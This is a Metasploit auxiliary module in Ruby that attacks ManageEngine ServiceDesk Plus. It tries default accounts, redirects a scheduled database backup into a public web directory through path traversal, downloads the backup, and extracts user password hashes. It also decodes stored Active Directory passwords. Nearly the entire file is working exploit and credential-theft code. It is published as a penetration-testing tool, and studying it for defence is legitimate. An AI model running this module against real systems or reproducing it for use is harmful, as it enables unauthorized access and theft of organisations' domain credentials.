##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary
	Rank = ExcellentRanking

	include Msf::Exploit::Remote::HttpClient
	include Msf::Auxiliary::Scanner

	@session_table = {}
	@file_name = nil
	@backup_created = 0

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'ManageEngine ServiceDesk database disclosure',
			'Description'    => %q{
					Due to improper validation of user access rights, there is a possibility,\
					having a guest rights by default (the account guest/guest), to reconfigure\
					the backup rules and perform the backup procedure at any time, at the same\
					time pointing out the directory in which to store the database service backup.
			},
			'Author'         =>
				[
					'PT Research Center', # Original discovery
					'Yuri Omelyanenko <yomelyanenko@ptsecurity.ru>',      # Metasploit module
					'Yuri Goltsev <ygoltsev@ptsecurity.ru>',      # Backup parsing methods
				],
			'License'        => MSF_LICENSE,
			'References'     =>
				[
					['URL', 'http://www.ptsecurity.ru/advisory1.aspx'],
					['URL', 'http://ptresearch.blogspot.com/2011/07/servicedesk-security-or-rate.html'],
				],
			'Privileged'     => true,
			'Platform'       => 'win',
			'Version'        => '',
			'Arch'           => ARCH_X86,
			'Targets'        => [[ 'Automatic', { }]],
			'DisclosureDate' => 'Jul 11 2011',
			'DefaultTarget'  => 0))

		register_options([
			OptString.new('URI', [true, "ManageEngine ServiceDesk directory path", "/"]),
		], self.class)
	end

	def check_default
		has_default = false

		res = send_request_raw({
			'method' => 'GET',
			'uri' => datastore['URI']
		}, 25)

		if (res and res.body =~ /ManageEngine ServiceDesk Plus<\/a><span>&nbsp;&nbsp;\|&nbsp;&nbsp;(\d).(\d).(\d)</)
			ver = [ $1.to_i, $2.to_i, $3.to_i ]
			print_status("ManageEngine ServiceDesk #{ver[0]}.#{ver[1]}.#{ver[2]} \n")

			print_status("Checking ServiceDesk for default accounts ...")
			default_usernames = ['administrator','guest']
			default_passwd = ['administrator','guest']

			flag_got_user = 0

			valid_user = Array.new
			default_usernames.each do |username|
				default_passwd.each do |password|

					res = send_request_raw({
						'method'  => 'GET',
						'uri'     => datastore['URI']
					}, 25)

					if (res and res.code == 200)
						if (res.headers['Set-Cookie'] and res.headers['Set-Cookie'].match(/JSESSIONID=(.*);(.*)/i))
							jsessionid = $1

							post_data = "j_username=#{username}&j_password=#{password}&LDAPEnable=false&hidden=%D0%92%D1%8B%D0%B1%D0%B5%D1%80%D0%B8%D1%82%D0%B5\
							+%D0%B4%D0%BE%D0%BC%D0%B5%D0%BD&hidden=%D0%94%D0%BB%D1%8F\
							+%D0%94%D0%BE%D0%BC%D0%B5%D0%BD%D0%B0&AdEnable=false&DomainCount=0&\
							LocalAuth=No&LocalAuthWithDomain=No&dynamicUserAddition_status=true\
							&localAuthEnable=true&logonDomainName=-1"

							res = send_request_cgi({
								'uri'          => '/j_security_check',
								'method'       => 'POST',
								'content-type' => 'application/x-www-form-urlencoded',
								'cookie'       => "JSESSIONID=#{jsessionid}",
								'data'         => post_data
							}, 25)

							if (res.code == 302)
								res = send_request_cgi({
									'uri'     => '/HomePage.do?logout=true&logoutSkipNV2Filter=true',
									'method'  => 'GET',
									'cookie'  => "JSESSIONID=#{jsessionid}"
								}, 25)

								if (res.code == 200)
									print_good("Found account:")
									print_good("login: #{username}")
									print_good("password: #{password}\n")
									report_auth_info(
										:host  => datastore['RHOST'],
										:port => datastore['RPORT'],
										:sname => 'http',
										:user => username,
										:pass => password,
										:active => true
									)
								end

								if(flag_got_user == 0)
									@session_table = {"#{username}" => "#{jsessionid}"}
									has_default = true
									flag_got_user = 1
								end
							end
						end
					end
				end
			end
		end

		return has_default
	end

	def make_backup(jsessionid)
		res = send_request_raw({
			'method' => 'GET',
			'uri' => datastore['URI']
		}, 25)

		if (res.code == 200 and res.headers['Date'].match(/(\d+) (\w+) (\d+) (\d+):(\d+):(\d+)/i))
			date = [ $1.to_i, $2.to_s, $3.to_i, $4.to_i, $5.to_i, $6.to_i ]

			month = date[1]
			months = {
				'Jan' => '01','Feb' => '02','Mar' => '03',
				'Apr' => '04','May' => '05','Jun' => '06',
				'Jul' => '07','Aug' => '08','Sep' => '09',
				'Oct' => '10','Nov' => '11','Dec' => '12'
			}
			months.each do|s_month,i_month|
				if (s_month == date[1])
					month = i_month
				end
			end

			if (date[0] < 10)
				day = '0' + date[0].to_s
			end
			if(date[3] < 10)
				hour = '0' + date[3].to_s
			end
			if (date[4] < 10)
				min = '0' + date[4].to_s
			end
			if ((date[0] >= 10) or (date[3] >= 10) or (date[4] >= 10))
				day = date[0].to_s
				hour = date[3].to_s
				min = date[4].to_s
			end

			res.body.match(/Login.js\?(\d+)/i)
			build = $1.to_i

			res = send_request_cgi({
				'uri'     => '/BackupSchedule.do?module=save_schedule&backupLocation=../inlineimages',
				'method'  => 'GET',
				'cookie'  => "JSESSIONID=#{jsessionid}"
			}, 25)

			wait_time = 5
			while((@backup_created != 1) and (wait_time != 0))
				print_status("Waiting 1 minute for backup to be created.")
				select(nil, nil, nil, 60.0)

				cicle = 0
				filename = "backup_servicedesk_#{build}_fullbackup_#{month}_#{day}_#{date[2]}_#{hour}_#{min}.data"
				while (@backup_created != 1 and cicle != 2)
					download_res = send_request_cgi({
						'uri'     => "/inlineimages/#{filename}",
						'method'  => 'GET',
						'cookie'  => "JSESSIONID=#{jsessionid}"
					}, 25)

					if (download_res.code == 200)
						@file_name = filename
						@backup_created = 1
					elsif (download_res.code == 404)
						hour = hour.to_i + 1
						if (hour < 10)
							hour = '0' + hour.to_s
						elsif (hour >= 24)
							hour = '00'
							cicle += 1
						end
						filename = "backup_servicedesk_#{build}_fullbackup_#{month}_#{day}_#{date[2]}_#{hour}_#{min}.data"
						@backup_created = 0
					end
				end
				wait_time -= 1
			end
		end
	end

	def terminate_session(jsessionid)
		res = send_request_cgi({
			'uri'     => '/jsp/Logout.jsp',
			'method'  => 'GET',
			'cookie'  => "JSESSIONID=#{jsessionid}"
		}, 25)

		if (res.code == 200)
			res = send_request_cgi({
				'uri'     => '/HomePage.do?logout=true&logoutSkipNV2Filter=true',
				'method'  => 'GET',
				'cookie'  => "JSESSIONID=#{jsessionid}"
			}, 25)
		end
	end

	def get_accounts(jsessionid, file_name)
		domain_accs = Array.new

		download_res = send_request_cgi({
			'uri'     => "/inlineimages/#{file_name}",
			'method'  => 'GET',
			'cookie'  => "JSESSIONID=#{jsessionid}"
		}, 25)

		if File.exists?(Dir.tmpdir + "/lastbackup.data")
			File.delete(Dir.tmpdir + "/lastbackup.data")
		end

		n_file = File.new(Dir.tmpdir + "/lastbackup.data","w")
		n_file.binmode
		n_file.write download_res.body
		n_file.rewind
		n_file.close
		if file_name != nil
			Zip::ZipFile.open(Dir.tmpdir + "/lastbackup.data", Zip::ZipFile::CREATE) {
			|zipfile|
				p2d =Array.new
				d2d =Array.new
				d_info = zipfile.read("domaininfo.sql")
				d_i = Array.new
				d_i = d_info.split("\n")
				d_i.each do |line|
					if /\((\d+),(.*)'(.*)',(.*),(.*),(.*),(.*)\);/.match line
						i=$1.to_i
						d2d[i]=$3
					end
				end
				p_info = zipfile.read("passwordinfo.sql")
				p_i = Array.new
				p_i = p_info.split("\n")
				p_i.each do |line|
					if /\((\d+),(.*)'(.*)',(.*)'(.*)'\);/.match line
						i = $1.to_i
						p2d[i] = $3
					end
				end
				d_login_info = zipfile.read("domainlogininfo.sql")
				d_l_i = Array.new
				d_l_i = d_login_info.split("\n")
				d_l_i.each do |line|
					if /\((\d+),(.*)'(.*)', (\d+)\);/.match line
						domain_id = $1.to_i
						login = $3
						password_id = $4.to_i
						follow_me = d2d[domain_id] + "\\" + login + " : " + base_deconverter(p2d[password_id])
						domain_accs.push(follow_me)
					end
				end

				# servicedesk accounts here
				accounts = Array.new
				login_info = zipfile.read("aaalogin.sql")
				l_i = Array.new
				l_i = login_info.split("\n")
				l_i.each do |line|
					if /(.*)\((\d+), (\d+), N\'(.*)\',(.*)\);/.match line
						i=$2.to_i
						accounts[i]=$4
					end
				end
				passwords = Array.new
				password_info = zipfile.read("aaapassword.sql")
				p_i = Array.new
				p_i = password_info.split("\n")
				p_i.each do |line|
					if /(.*)\((\d+), N\'(.*)\', N\'(.*)\', N'(.*)', (\d+),(.*)\);/.match line
						i=$2.to_i
						tmp = Array.new
						tmp = Base64.decode64($3).unpack('H*')
						md5hash = ''
						tmp.each do |aa|
							md5hash = aa
						end
						passwords[i]= md5hash + ":" + $5
					end
				end

				full_accounts = Array.new
				acc_pwd_info = zipfile.read("aaaaccpassword.sql")
				a_p_i = Array.new
				a_p_i = acc_pwd_info.split("\n")
				t = 0
				a_p_i.each do |line|
					if /(.*)\((\d+), (\d+)\);/.match line
						acc_id=$2.to_i
						pwd_id=$3.to_i
						full_accounts[t] = accounts[acc_id] + ":" + passwords[pwd_id]
						t += 1
					end
				end
				if full_accounts.size > 0
					print_status("ServiceDesk user accounts (algorithm - md5($pass.$salt)): (username:md5hash:salt)")
					full_accounts.each do |line|
						tmp = Array.new
						tmp = line.split(":")
						report_auth_info(
							:host  => datastore['RHOST'],
							:port => datastore['RPORT'],
							:sname => 'http',
							:user => tmp[0],
							:pass => tmp[1] + ":" + tmp[2],
							:active => true
						)
						print_good(line)
					end
				end
			}
		else
			print_error("Latest backup not found.\n")
		end

		if File.exists?(Dir.tmpdir + "/lastbackup.data")
			File.delete(Dir.tmpdir + "/lastbackup.data")
		end

		return domain_accs
	end

	def base_deconverter(xstr)
		xstr = xstr.gsub('Z','000')
		base = Array.new

		ind = 0
		bs_count = 48
		while bs_count < 59
			base[ind] = bs_count.chr.to_s
			bs_count += 1
			ind += 1
		end
		ind -= 1
		bs_count = 97
		while bs_count < 124
			base[ind] = bs_count.chr.to_s
			bs_count += 1
			ind += 1
		end
		ind -= 1
		bs_count = 65
		while bs_count < 90
			if bs_count.chr.to_s == "I"
				ind -= 1
			end
			base[ind] = bs_count.chr.to_s
			bs_count += 1
			ind += 1
		end

		answer = ""
		k = 0
		j = xstr.size/6
		j = j.to_i
		while k < j
			xpart=xstr[6*k..6*k+5]
			i = 0
			xpos = ""
			startnum = 0
			while i < 5
				isthere = 0
				pos = 0
				xalpha = xpart[i,1]
				while isthere == 0
					if base[pos] == xalpha
						xpos = xpos + pos.to_s
						isthere = 1
						if pos == 0
							if startnum == 0
								answer << startnum.to_s
							end
						else
							startnum = 1
						end
					end
					pos += 1
				end
				i += 1
			end

			isthere = 0
			pos = 0
			reminder = 0
			while isthere == 0
				if xpart[5,1] == base[pos]
					reminder = pos
					isthere = 1
				end
				pos += 1
			end

			if xpos.to_s == "00000"
				if reminder != 0
					tempo = reminder.to_s
					temp1 = answer.to_s[0,answer.size-tempo.size]
					answer = temp1 + tempo
				end
			else
				answer << (xpos.to_i * 60 + reminder.to_i).to_s
			end
			k += 1
		end
		if xstr.size % 6 != 0
			xend = xstr[6*k..xstr.size]
			xpos = ''
			if (xend.size > 1)
				i = 0
				startnum = 0

				while i < xend.size - 1
					isthere = 0
					pos = 0
					xalpha = xend[i,1]
					while isthere == 0
						if base[pos] == xalpha
							isthere = 1
							xpos = xpos + pos.to_s
							if pos == 0
								if startnum == 0
									answer << startnum.to_s
								end
							else
								startnum = 1
							end
						end
						pos += 1
					end
					i += 1
				end
				isthere = 0
				pos = 0
				while isthere == 0
					xalpha = xend[i,1]
					if xalpha == base[pos]
						reminder = pos
						isthere = 1
					end
					pos += 1
				end
				answer << (xpos.to_i * 60 + reminder.to_i).to_s
			else
				isthere = 0
				pos = 0
				while isthere == 0
					xalpha = xstr[6*k..xstr.size]
					if xalpha == base[pos]
						isthere = 1
						reminder = pos
					end
					pos += 1
				end
				answer << reminder.to_s
			end
		end
		answer = answer.to_s
		strbits = answer.size / 2
		intbits = strbits.to_i
		fin = ""
		i = 0
		while i < answer.size / 2
			a = answer[2*i,2]
			b = a.to_i + 28
			fin = fin + b.chr
			i += 1
		end
		fin = fin.reverse
		return fin
	end

	# Module execution
	def run_host(ip)
		if check_default
			@session_table.each do|user,id|
				make_backup(id)

				if(@backup_created == 1)
					print_status("Downloading and processing created backup ...\n")
					domain_accounts = get_accounts(id, @file_name)

					if domain_accounts.size > 0
						print_status("Active Directory accounts (DOMAIN\\USERNAME : PASSWORD) :")
						domain_accounts.each do |acc|
							tmp = Array.new
							tmp = acc.split(" : ")
							report_auth_info(
								:host  => datastore['RHOST'],
								:port => 445,
								:sname => 'smb',
								:user => tmp[0],
								:pass => tmp[1],
								:active => true
							)
							print_good(acc)
						end
					else
						print_error("Latest database does not contains any domain accouns.\n")
					end

					print_status("Direct link to created backup: http://#{target_host}:#{rport}/#{@file_name}\n")
				else
					print_error("For some reason, no backup was created.")
					if(user == 'administrator')
						print_status("But you have administrator account! Go check out for yourself :)\n")
					end
				end

				terminate_session(id)
			end
		else
			print_error("No default users found. Exploit failed.\n")
		end
	end
end
